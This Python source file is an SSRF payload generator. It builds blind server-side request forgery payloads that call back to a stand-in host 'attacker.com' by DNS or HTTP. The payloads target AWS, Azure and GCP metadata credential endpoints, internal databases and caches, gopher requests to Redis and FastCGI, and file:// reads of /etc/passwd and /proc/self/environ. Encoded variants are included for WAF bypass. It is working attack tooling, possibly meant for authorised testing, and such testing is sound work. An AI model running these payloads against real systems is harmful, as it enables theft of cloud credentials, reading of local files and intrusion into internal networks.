"""
SSRF Payload Generator

Generates blind SSRF payloads with DNS exfiltration callbacks.
Includes cloud metadata endpoints and internal service probes.
"""

from typing import List, Dict
import uuid

class SSRFPayloadEngine:
    """
    Generates SSRF payloads for blind detection via OOB callbacks.
    """
    
    # SSRF-risky parameter names
    SSRF_PARAM_KEYWORDS = [
        'url', 'link', 'target', 'callback', 'webhook', 'image', 'avatar',
        'redirect', 'next', 'file', 'fetch', 'fetch_url', 'uri', 'endpoint',
        'host', 'server', 'proxy', 'request_url', 'notification_url', 'return_url'
    ]
    
    def __init__(self, listener_url: str = "http://attacker.com"):
        """
        Args:
            listener_url: Base URL for OOB callback (will be replaced with UUID)
        """
        self.listener_url = listener_url
    
    def generate_callback_id(self) -> str:
        """Generate a unique callback identifier."""
        return str(uuid.uuid4())
    
    def generate_dns_payload(self, callback_id: str) -> str:
        """
        Generate a DNS exfiltration payload.
        Uses DNS lookup to confirm SSRF.
        
        Example: curl http://target.com/?url=http://169.254.169.254.{callback_id}.attacker.com
        """
        # Extract domain from listener_url
        domain = self.listener_url.replace("http://", "").replace("https://", "").split(":")[0]
        dns_host = f"{callback_id}.ssrf.{domain}"
        return f"http://{dns_host}/"
    
    def generate_http_payload(self, callback_id: str) -> str:
        """
        Generate an HTTP callback payload.
        """
        return f"{self.listener_url}/ssrf?id={callback_id}"
    
    def generate_aws_metadata_payload(self, callback_id: str) -> str:
        """
        AWS metadata endpoint + DNS exfiltration.
        If accessible, attacker can exfiltrate credentials via DNS.
        """
        domain = self.listener_url.replace("http://", "").replace("https://", "").split(":")[0]
        dns_host = f"{callback_id}.aws.{domain}"
        # Payload: curl the metadata endpoint and exfil via DNS
        # This is blind, so we assume the backend will fetch it
        return f"http://169.254.169.254/latest/meta-data/iam/security-credentials/?callback=http://{dns_host}/"
    
    def generate_azure_metadata_payload(self, callback_id: str) -> str:
        """Azure metadata endpoint."""
        domain = self.listener_url.replace("http://", "").replace("https://", "").split(":")[0]
        dns_host = f"{callback_id}.azure.{domain}"
        return f"http://169.254.169.254/metadata/instance/?api-version=2021-02-01&callback=http://{dns_host}/"
    
    def generate_gcp_metadata_payload(self, callback_id: str) -> str:
        """GCP metadata endpoint."""
        domain = self.listener_url.replace("http://", "").replace("https://", "").split(":")[0]
        dns_host = f"{callback_id}.gcp.{domain}"
        return f"http://metadata.google.internal/computeMetadata/v1/instance/?callback=http://{dns_host}/"
    
    def generate_localhost_payload(self, callback_id: str) -> str:
        """Probe localhost common services."""
        domain = self.listener_url.replace("http://", "").replace("https://", "").split(":")[0]
        dns_host = f"{callback_id}.local.{domain}"
        return f"http://localhost:80/?callback=http://{dns_host}/"
    
    def generate_internal_ip_payloads(self, callback_id: str) -> List[str]:
        """Probe common internal IP ranges."""
        domain = self.listener_url.replace("http://", "").replace("https://", "").split(":")[0]
        payloads = []
        
        # Common internal IPs
        internal_ips = [
            "127.0.0.1", "localhost", "169.254.169.254",
            "192.168.1.1", "10.0.0.1", "172.16.0.1"
        ]
        
        for ip in internal_ips:
            dns_host = f"{callback_id}.{ip.replace('.', '-')}.{domain}"
            payloads.append(f"http://{ip}/?callback=http://{dns_host}/")
        
        return payloads
    
    def generate_internal_service_payloads(self, callback_id: str) -> List[str]:
        """
        Probe internal services on common ports.
        Targets databases, caches, message queues, etc.
        """
        domain = self.listener_url.replace("http://", "").replace("https://", "").split(":")[0]
        payloads = []
        
        # Internal services with common ports
        services = [
            ("localhost", 22, "ssh"),       # SSH
            ("localhost", 3306, "mysql"),   # MySQL
            ("localhost", 5432, "postgres"), # PostgreSQL
            ("localhost", 6379, "redis"),   # Redis
            ("localhost", 27017, "mongo"),  # MongoDB
            ("localhost", 9200, "elastic"), # Elasticsearch
            ("localhost", 5672, "rabbit"),  # RabbitMQ
            ("localhost", 11211, "memcache"), # Memcached
            ("localhost", 8080, "admin"),   # Admin panels
            ("localhost", 8443, "https"),   # HTTPS internal
            ("127.0.0.1", 3306, "mysql"),
            ("127.0.0.1", 5432, "postgres"),
            ("127.0.0.1", 6379, "redis"),
            ("internal-db", 5432, "db"),
            ("db", 5432, "db"),
            ("redis", 6379, "cache"),
            ("mysql", 3306, "mysql"),
        ]
        
        for host, port, service in services:
            dns_host = f"{callback_id}.{service}.{domain}"
            payloads.append(f"http://{host}:{port}/?callback=http://{dns_host}/")
        
        return payloads
    
    def generate_gopher_payloads(self, callback_id: str) -> List[str]:
        """
        Generate Gopher protocol payloads.
        Gopher can be used to interact with internal services.
        """
        domain = self.listener_url.replace("http://", "").replace("https://", "").split(":")[0]
        payloads = []
        
        # Gopher payloads for various services
        gopher_targets = [
            ("127.0.0.1", 6379, "redis", "_GET / HTTP/1.1"),  # Redis
            ("127.0.0.1", 9000, "fastcgi", "_GET / HTTP/1.1"), # FastCGI
            ("127.0.0.1", 11211, "memcache", "_stats"),       # Memcached
            ("localhost", 25, "smtp", "_HELO test"),          # SMTP
        ]
        
        for host, port, service, command in gopher_targets:
            dns_host = f"{callback_id}.gopher-{service}.{domain}"
            # Gopher URL format: gopher://host:port/_{command}
            payloads.append(f"gopher://{host}:{port}/{command}?callback=http://{dns_host}/")
        
        return payloads
    
    def generate_file_protocol_payloads(self, callback_id: str) -> List[str]:
        """
        Generate file:// protocol payloads.
        Can be used to read local files or access UNC paths.
        """
        domain = self.listener_url.replace("http://", "").replace("https://", "").split(":")[0]
        payloads = []
        
        # File protocol targets
        file_targets = [
            "/etc/passwd",           # Linux passwd file
            "/etc/hosts",            # Hosts file
            "/proc/self/environ",    # Process environment
            "///etc/passwd",         # Triple slash variant
            "//localhost/etc/passwd", # With host
            "C:/Windows/win.ini",    # Windows file
            "C:/Windows/System32/drivers/etc/hosts", # Windows hosts
        ]
        
        for target in file_targets:
            dns_host = f"{callback_id}.file.{domain}"
            payloads.append(f"file://{target}?callback=http://{dns_host}/")
        
        return payloads
    
    def generate_encoded_payloads(self, base_payload: str, callback_id: str) -> List[str]:
        """
        Generate encoded variations of payloads.
        Helps bypass basic filters and WAFs.
        """
        import urllib.parse
        
        domain = self.listener_url.replace("http://", "").replace("https://", "").split(":")[0]
        payloads = []
        
        # URL encoding
        url_encoded = urllib.parse.quote(base_payload, safe='')
        payloads.append(url_encoded)
        
        # Double URL encoding
        double_encoded = urllib.parse.quote(url_encoded, safe='')
        payloads.append(double_encoded)
        
        # Case variations
        payloads.append(base_payload.replace("http://", "HTTP://"))
        payloads.append(base_payload.replace("http://", "HtTp://"))
        
        # Unicode encoding (for localhost)
        if "localhost" in base_payload:
            # Using decimal encoding
            payloads.append(base_payload.replace("localhost", "127.0.0.1"))
            # Using hex encoding
            payloads.append(base_payload.replace("localhost", "0x7f.0x0.0x0.0x1"))
            # Using octal encoding
            payloads.append(base_payload.replace("localhost", "0177.0.0.0.1"))
        
        # IPv6 variations
        if "127.0.0.1" in base_payload:
            payloads.append(base_payload.replace("127.0.0.1", "[::1]"))
            payloads.append(base_payload.replace("127.0.0.1", "[0:0:0:0:0:0:0:1]"))
        
        return payloads
    
    def get_all_payloads(self, callback_id: str) -> Dict[str, str]:
        """
        Return all payload types for comprehensive SSRF testing.
        
        Returns:
            Dict mapping payload type -> payload URL
        """
        payloads = {
            "dns": self.generate_dns_payload(callback_id),
            "http": self.generate_http_payload(callback_id),
            "aws_metadata": self.generate_aws_metadata_payload(callback_id),
            "azure_metadata": self.generate_azure_metadata_payload(callback_id),
            "gcp_metadata": self.generate_gcp_metadata_payload(callback_id),
            "localhost": self.generate_localhost_payload(callback_id),
        }
        
        return payloads
    
    def get_advanced_payloads(self, callback_id: str) -> Dict[str, List[str]]:
        """
        Return advanced payload types including internal services,
        alternative protocols, and encoded variations.
        
        Returns:
            Dict mapping payload category -> list of payloads
        """
        return {
            "internal_services": self.generate_internal_service_payloads(callback_id),
            "gopher": self.generate_gopher_payloads(callback_id),
            "file_protocol": self.generate_file_protocol_payloads(callback_id),
            "internal_ips": self.generate_internal_ip_payloads(callback_id),
        }
    
    def get_encoded_variations(self, callback_id: str) -> Dict[str, List[str]]:
        """
        Generate encoded variations of base payloads for WAF bypass.
        
        Returns:
            Dict mapping base payload type -> encoded variations
        """
        base_http = self.generate_http_payload(callback_id)
        base_localhost = self.generate_localhost_payload(callback_id)
        
        return {
            "http_encoded": self.generate_encoded_payloads(base_http, callback_id),
            "localhost_encoded": self.generate_encoded_payloads(base_localhost, callback_id),
        }
    
    def is_ssrf_parameter(self, param_name: str) -> bool:
        """
        Check if parameter name suggests SSRF vulnerability.
        """
        param_lower = param_name.lower()
        
        # Exact match
        if param_lower in self.SSRF_PARAM_KEYWORDS:
            return True
        
        # Contains keyword
        for keyword in self.SSRF_PARAM_KEYWORDS:
            if keyword in param_lower:
                return True
        
        return False
